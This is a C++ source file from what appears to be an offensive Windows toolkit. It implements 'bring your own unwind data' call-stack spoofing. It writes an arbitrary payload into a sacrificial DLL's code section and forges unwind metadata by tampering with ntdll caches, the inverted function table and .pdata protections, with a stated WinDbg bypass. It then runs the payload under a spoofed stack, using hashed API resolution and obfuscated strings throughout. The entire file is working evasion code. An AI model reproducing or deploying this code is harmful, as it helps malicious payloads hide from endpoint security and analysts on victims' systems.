/* StackSpoofing.cpp */
#include <Windows.h>
#include "Structs.h"
#include "Primitives.h"
#include "Common.h"
#include "Debug.h"

/*================================================
@ FlushFunctionTableCache Function
# Nullifies the cached size field inside
# RtlLookupFunctionTable by scanning for the
# MOV EAX,[RIP+offset] pattern and zeroing the
# target. Forces a cache miss on next lookup
================================================*/
BOOL StackSpoof::FlushFunctionTableCache(
    OUT PULONG_PTR puAddress,
    OUT PDWORD pdwOld
) {
    PVOID                   Ntdll           = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
    ULONG_PTR               FnAddress       = (ULONG_PTR)Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionTable"));

    BYTE Buffer[128] = { 0 };
    Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));

    ULONG_PTR CacheAddress = 0;

    /* MOV EAX, [RIP + offset] -> 0x8B 0x05 [rel32] */
    for (int i = 0; i < 100; i++) {

        if (Buffer[i] == 0x8B && Buffer[i + 1] == 0x05) {

            INT32 Offset = 0;
            Primitive::MemoryCopy(&Offset, &Buffer[i + 2], sizeof(INT32));
            ULONG_PTR Candidate = FnAddress + i + 6 + Offset;
            if (Candidate > (ULONG_PTR)Ntdll && Candidate < (ULONG_PTR)Ntdll + 0x300000) {
                CacheAddress = Candidate;
                break;
            }
        }
    }

    if (!CacheAddress)
        return FALSE;

    *puAddress      = CacheAddress;
    *pdwOld         = *(PDWORD)CacheAddress;

    DWORD       OldProtect      = 0;
    PVOID       BaseAddress     = (PVOID)CacheAddress;
    SIZE_T      RegionSize      = sizeof(DWORD);

    Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_READWRITE, &OldProtect);
    *(PDWORD)CacheAddress = 0;
    Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, OldProtect, &OldProtect);
    return TRUE;
}

/*================================================
@ FlushFunctionEntryCache Function
# Same technique applied to RtlLookupFunctionEntry
# Ensures both lookup paths miss their cache after
# .pdata and _INVERTED_FUNCTION_TABLE are modified
================================================*/
BOOL StackSpoof::FlushFunctionEntryCache(
    OUT PULONG_PTR puAddress,
    OUT PDWORD pdwOld
) {
    PVOID                   Ntdll = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
    ULONG_PTR               FnAddress = (ULONG_PTR)Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionEntry"));

    BYTE Buffer[128] = { 0 };
    Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));

    ULONG_PTR CacheAddress = 0;

    /* MOV EAX, [RIP + offset] -> 0x8B 0x05 [rel32] */
    for (int i = 0; i < 100; i++) {

        if (Buffer[i] == 0x8B && Buffer[i + 1] == 0x05) {

            INT32 Offset = 0;
            Primitive::MemoryCopy(&Offset, &Buffer[i + 2], sizeof(INT32));
            ULONG_PTR Candidate = FnAddress + i + 6 + Offset;
            if (Candidate > (ULONG_PTR)Ntdll && Candidate < (ULONG_PTR)Ntdll + 0x300000) {
                CacheAddress = Candidate;
                break;
            }
        }
    }

    if (!CacheAddress)
        return FALSE;

    *puAddress = CacheAddress;
    *pdwOld = *(PDWORD)CacheAddress;

    DWORD       OldProtect = 0;
    PVOID       BaseAddress = (PVOID)CacheAddress;
    SIZE_T      RegionSize = sizeof(DWORD);

    Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_READWRITE, &OldProtect);
    *(PDWORD)CacheAddress = 0;
    Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, OldProtect, &OldProtect);
    return TRUE;
}

/*================================================
@ SuppressPDataAccess Function
# Sets .pdata to PAGE_NOACCESS so the OS unwinder
# cannot read static entries and falls back to the
# dynamic function table registered via
# RtlAddFunctionTable
================================================*/
BOOL StackSpoof::SuppressPDataAccess(
    _In_ PVOID pModule,
    OUT PDWORD pdwOldProtect
) {
    ULONG_PTR Base = (ULONG_PTR)pModule;

    auto Nt = (PIMAGE_NT_HEADERS)(Base + ((PIMAGE_DOS_HEADER)Base)->e_lfanew);
    auto SectionHeader = IMAGE_FIRST_SECTION(Nt);
    NTSTATUS Status = STATUS_SUCCESS;

    for (int i = 0; i < Nt->FileHeader.NumberOfSections; i++) {

        const CHAR SectionName[] = { '.', 'p', 'd', 'a', 't', 'a', '\0' };
        SIZE_T NameLength = Primitive::StringLength(SectionName);

        if (Primitive::MemoryCompare(SectionHeader[i].Name, (PCHAR)SectionName, NameLength) == 0) {

            PVOID                       BaseAddress             = (PVOID)(Base + SectionHeader[i].VirtualAddress);
            SIZE_T                      RegionSize              = (SectionHeader[i].Misc.VirtualSize + 0xFFF) & ~0xFFF;
            
            if (!NT_SUCCESS(Status = Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_NOACCESS, pdwOldProtect))) {
#ifdef DEBUG
                DBGPRINT("[-] WorkItemNtProtectVirtualMemory Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
                return FALSE;
            }

            return TRUE;
        }
    }

    return FALSE;
}

/*================================================
@ RestorePDataAccess Function
# Reverts .pdata protection to its original value
# stored during SuppressPDataAccess, re-enabling
# static exception directory access
================================================*/
BOOL StackSpoof::RestorePDataAccess(
    _In_ PVOID pModule,
    _In_ DWORD dwOldProtect
) {
    ULONG_PTR Base = (ULONG_PTR)pModule;

    auto Nt = (PIMAGE_NT_HEADERS)(Base + ((PIMAGE_DOS_HEADER)Base)->e_lfanew);
    auto SectionHeader = IMAGE_FIRST_SECTION(Nt);
    NTSTATUS Status = STATUS_SUCCESS;
    DWORD Dummy = 0;

    for (int i = 0; i < Nt->FileHeader.NumberOfSections; i++) {

        const CHAR SectionName[] = { '.', 'p', 'd', 'a', 't', 'a', '\0' };
        SIZE_T NameLength = Primitive::StringLength(SectionName);

        if (Primitive::MemoryCompare(SectionHeader[i].Name, (PCHAR)SectionName, NameLength) == 0) {

            PVOID                       BaseAddress = (PVOID)(Base + SectionHeader[i].VirtualAddress);
            SIZE_T                      RegionSize = (SectionHeader[i].Misc.VirtualSize + 0xFFF) & ~0xFFF;

            if (!NT_SUCCESS(Status = Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, dwOldProtect, &Dummy))) {
#ifdef DEBUG
                DBGPRINT("[-] WorkItemNtProtectVirtualMemory Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
                return FALSE;
            }

            return TRUE;
        }
    }

    return FALSE;
}

/*================================================
@ ConstructShadowGateParams Function
# Builds a SHADOW_GATE_PARAMS struct from an
# argument array. Allocates enough space for the
# base struct plus variable-length argv, then
# copies function pointer, frame size, and args
================================================*/
PSHADOWGATE_PARAMS StackSpoof::ConstructShadowGateParams(
    _In_ PVOID pFunction,
    _In_ DWORD dwFrameSize,
    _In_ ULONG_PTR Argc,
    _In_ PULONG_PTR pArgv
) {
    SIZE_T  Size = sizeof(SHADOWGATE_PARAMS) + (Argc > 0 ? (Argc-1) * sizeof(ULONG_PTR) : 0);
    PSHADOWGATE_PARAMS ShadowParams = (PSHADOWGATE_PARAMS)::operator new(Size);
    if (!ShadowParams)
        return nullptr;

    ShadowParams->pFunction                 = (ULONG_PTR)pFunction;
    ShadowParams->dwMinimumFrameSize        = dwFrameSize;
    ShadowParams->argc                      = Argc;

    for (ULONG_PTR i = 0; i < Argc; i++)
        ShadowParams->argv[i] = pArgv[i];

    return ShadowParams;
}

/*================================================
@ ConstructShadowGateParamsVa Function
# Variadic version of ConstructShadowGateParams.
# Same allocation and layout but pulls arguments
# from va_list instead of an array pointer
================================================*/
PSHADOWGATE_PARAMS StackSpoof::ConstructShadowGateParamsVa(
    _In_ PVOID pFunction,
    _In_ DWORD dwFrameSize,
    _In_ ULONG_PTR Argc,
    ...
) {
    SIZE_T  Size = sizeof(SHADOWGATE_PARAMS) + (Argc > 0 ? (Argc-1) * sizeof(ULONG_PTR) : 0);
    PSHADOWGATE_PARAMS ShadowParams = (PSHADOWGATE_PARAMS)::operator new(Size);
    va_list Args;
    if (!ShadowParams)
        return nullptr;
    
    ShadowParams->pFunction             = (ULONG_PTR)pFunction;
    ShadowParams->dwMinimumFrameSize    = dwFrameSize;
    ShadowParams->argc                  = Argc;

    va_start(Args, Argc);
    for (ULONG_PTR i = 0; i < Argc; i++)
        ShadowParams->argv[i] = va_arg(Args, ULONG_PTR);
    va_end(Args);

    return ShadowParams;
}

/*================================================
@ RegisterSpoofedRuntimeFunction Function
# Orchestrator — executes all layers of
# Technique 6 in sequence:
#   1. Find donor, borrow UnwindData
#   2. Collapse _INVERTED_FUNCTION_TABLE entry
#   3. Flush ntdll caches
#   4. RtlAddFunctionTable + Type=0 trick
#   5. .pdata -> PAGE_NOACCESS
# Every modification is tracked in BYOUD_CONTEXT
# for clean reversal via RevertAllSpoofChanges
================================================*/
BOOL StackSpoof::RegisterSpoofedRuntimeFunction(
    _Inout_ PBYOUD_CONTEXT pByoudCtx,
    _In_ PVOID pModule,
    _In_ DWORD dwShcOffset,
    _In_ DWORD dwShcSize,
    _In_ DWORD dwDesired,
    OUT PDWORD pdwActual
) {
    PRUNTIME_FUNCTION RuntimeFunction = (PRUNTIME_FUNCTION)::operator new(sizeof(RUNTIME_FUNCTION));
    if (!RuntimeFunction)
        return FALSE;

    PRUNTIME_FUNCTION Donor = Unwinder::FindDonorByFrameSize(pModule, dwDesired, FALSE, pdwActual);
    if (!Donor) {
        ::operator delete(RuntimeFunction);
#ifdef DEBUG
        DBGPRINT("[-] No Donor Found For Desired Size 0x%lx \n", dwDesired);
#endif
        return FALSE;
    }

    RuntimeFunction->BeginAddress = dwShcOffset;
    RuntimeFunction->EndAddress = dwShcOffset + dwShcSize;
    RuntimeFunction->UnwindData = Donor->UnwindData;

    /* Unlock .pdata for manipulation */
    Unwinder::UnlockPDataSection(pModule);

    /* Collapse ImageSize in _INVERTED_FUNCTION_TABLE */
    ULONG OldInv = 0;
    Unwinder::CollapseInvertedTableEntry(pModule, &OldInv);
    ByoudContext::TrackInvertedTableCollapse(pByoudCtx, pModule, OldInv);

    /* Flush ntdll lookup caches */
    ULONG_PTR       CacheAddress = 0;
    DWORD           Old = 0;

    StackSpoof::FlushFunctionTableCache(&CacheAddress, &Old);
    if (CacheAddress) {
        ByoudContext::TrackCacheNullification(pByoudCtx, CacheAddress, Old);
    }

    CacheAddress = 0;
    Old = 0;

    StackSpoof::FlushFunctionEntryCache(&CacheAddress, &Old);
    if (CacheAddress) {
        ByoudContext::TrackCacheNullification(pByoudCtx, CacheAddress, Old);
    }

    /* Re-lock .pdata */
    Unwinder::LockPDataSection(pModule);

    /* Register dynamic function table */
    g_Win32.Nt.RtlAddFunctionTable(RuntimeFunction, 1, (DWORD64)pModule);
    ByoudContext::TrackDynamicTableInsertion(pByoudCtx, RuntimeFunction);

    /* Type=0 patch for WinDbg bypass */
    PDYNAMIC_FUNCTION_TABLE DynamicEntry = Unwinder::LocateDynamicFunctionTableEntry(
        (ULONG_PTR)pModule + dwShcOffset
    );

    if (DynamicEntry) {
        ByoudContext::TrackDynamicTableTypeChange(pByoudCtx, DynamicEntry, DynamicEntry->Type);
        DynamicEntry->Type = 0;
    }

    /* .pdata -> PAGE_NOACCESS */
    DWORD NaOld = 0;
    StackSpoof::SuppressPDataAccess(pModule, &NaOld);

    BYOUD_CHANGE NaChange = {};
    NaChange.Type = BCT_PDATA_NOACCESS;
    NaChange.u.Pdata.pModule = pModule;
    NaChange.u.Pdata.OldProtect = NaOld;
    ByoudContext::CommitSpoofChange(pByoudCtx, &NaChange);

    return TRUE;
}

/*================================================
@ ExecuteWithSpoofedStack Function
# Top-level wrapper: loads sacrificial DLL, writes
# payload + ShadowGate stub into .text slack space,
# registers spoofed RUNTIME_FUNCTION, measures
# stack distance, calls payload via ShadowGate,
# then reverts all changes
================================================*/
ULONG_PTR StackSpoof::ExecuteWithSpoofedStack(
    _In_ PVOID pPayload,
    _In_ DWORD dwPayloadSize
) {
    WCHAR DllName[] = { L'w',L'i',L'n',L'd',L'o',L'w',L's',L'.',L's',L't',L'o',L'r',L'a',L'g',L'e',L'.',L'd',L'l',L'l',L'\0' };

    /* Load sacrificial DLL */
    PVOID pModule = Proxy::WorkItemLoadLibrary(DllName);
    if (!pModule) {
#ifdef DEBUG
        DBGPRINT("[-] Failed To Load Sacrificial DLL \n");
#endif
        return 0;
    }

#ifdef DEBUG
    DBGPRINT("[+] Sacrificial DLL Loaded -> 0x%p \n", pModule);
#endif

    /* Write payload into .text slack space */
    DWORD dwPayloadRva = 0;
    if (!Unwinder::AppendCodeToText(pModule, pPayload, dwPayloadSize, &dwPayloadRva)) {
#ifdef DEBUG
        DBGPRINT("[-] Failed To Append Payload To .text \n");
#endif
        return 0;
    }

    /* Write ShadowGate stub into .text slack space */
    PVOID pShadowGateLocal = (PVOID)ShadowGate;
    DWORD dwShadowGateSize = (DWORD)((ULONG_PTR)ShadowGateEnd - (ULONG_PTR)ShadowGate);

    DWORD dwGateRva = 0;
    if (!Unwinder::AppendCodeToText(pModule, pShadowGateLocal, dwShadowGateSize, &dwGateRva)) {
#ifdef DEBUG
        DBGPRINT("[-] Failed To Append ShadowGate To .text \n");
#endif
        return 0;
    }

#ifdef DEBUG
    DBGPRINT("[+] Payload RVA: 0x%lx, ShadowGate RVA: 0x%lx (Size: 0x%lx) \n",
        dwPayloadRva, dwGateRva, dwShadowGateSize);
#endif

    /* Measure stack distance */
    ULONG_PTR       StackPtr            = 0;
    ULONG_PTR       StackSpace          = StackUtils::ResolveThreadStackOrigin(&StackPtr);
    ULONG_PTR       RspHere             = CaptureStackPointer();
    
    StackSpace = StackPtr - RspHere + 8;

    /* Initialize spoof context */
    BYOUD_CONTEXT Ctx = {};
    ByoudContext::InitializeSpoofContext(&Ctx, RTFI_JIT_WINDBG, pModule);

    /* Register spoofed RUNTIME_FUNCTION */
    DWORD dwActual = 0;
    if (!StackSpoof::RegisterSpoofedRuntimeFunction(
        &Ctx, pModule, dwPayloadRva, dwPayloadSize,
        (DWORD)StackSpace + 8, &dwActual))
    {
#ifdef DEBUG
        DBGPRINT("[-] RegisterSpoofedRuntimeFunction Failed \n");
#endif
        ByoudContext::RevertAllSpoofChanges(&Ctx);
        return 0;
    }

    /* Adjust for ShadowGate's 6 register push pairs */
    if (dwActual > 0)
        dwActual -= 6 * 8;

    /* Build params and execute via copied ShadowGate in .text */
    PVOID pEntryPoint = (PVOID)((ULONG_PTR)pModule + dwPayloadRva);
    ULONG_PTR Args[] = { 0 };

    PSHADOWGATE_PARAMS pParams = StackSpoof::ConstructShadowGateParams(
        pEntryPoint, dwActual, 0, Args
    );

    typedef ULONG_PTR(*fnShadowGate)(PSHADOWGATE_PARAMS);
    fnShadowGate pCopiedGate = (fnShadowGate)((ULONG_PTR)pModule + dwGateRva);

    if (g_PayloadReady)
        g_Win32.Nt.NtSetEvent(g_PayloadReady, nullptr);

    ULONG_PTR Result = pCopiedGate(pParams);

#ifdef DEBUG
    DBGPRINT("[+] Payload Returned -> 0x%Ix \n", Result);
#endif

    /* Cleanup */
    ::operator delete(pParams);
    ByoudContext::RevertAllSpoofChanges(&Ctx);

    return Result;
}